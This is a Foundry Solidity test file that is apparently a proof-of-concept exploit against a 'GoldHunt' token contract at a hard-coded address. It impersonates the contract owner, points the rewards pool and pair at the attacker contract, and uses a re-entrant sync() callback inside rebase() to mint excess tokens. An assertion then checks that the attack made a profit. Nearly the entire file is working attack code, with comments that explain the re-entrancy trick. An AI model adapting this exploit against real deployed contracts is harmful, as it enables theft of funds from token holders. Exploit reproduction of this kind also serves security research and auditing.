pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IGoldHunt {
    function owner() external view returns (address);
    function setRewardsPool(address _rewardsPool) external;
    function setPair(address _pair) external;
    function rebase(uint multiple) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x6D3dd96f97b10fc86A7F8607704BBe9936083b89;
    address attacker = address(this);
    IGoldHunt goldHunt;
    bool reentered;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        goldHunt = IGoldHunt(TARGET);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0x6D3dd96f97b10fc86A7F8607704BBe9936083b89).balanceOf(address(this));
        vm.startPrank(goldHunt.owner());

        // Set the rewards pool to the attacker's contract.
        goldHunt.setRewardsPool(attacker);

        // Set the pair to the attacker's contract to intercept the sync() call for re-entrancy.
        goldHunt.setPair(attacker);

        // Trigger the first rebase, which will lead to the re-entrant call in our sync() function.
        // The outer multiple (e.g., 100) gets cancelled out, and the final balance multiplication
        // is determined by the inner multiple (2 in this case).
        goldHunt.rebase(100);

        vm.stopPrank();
        uint256 finalBalance = IERC20(0x6D3dd96f97b10fc86A7F8607704BBe9936083b89).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    function sync() external {
    if (!reentered) {
        reentered = true;
        // Re-enter the rebase function. At this point, _balances are inflated from the outer call,
        // but rebaseMultiple is still its old value. This call will use the inflated balance
        // to mint an excessive amount of new tokens.
        // The final balance will be initial_balance * multiple (2 in this case).
        goldHunt.rebase(2);
    }
    }
    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

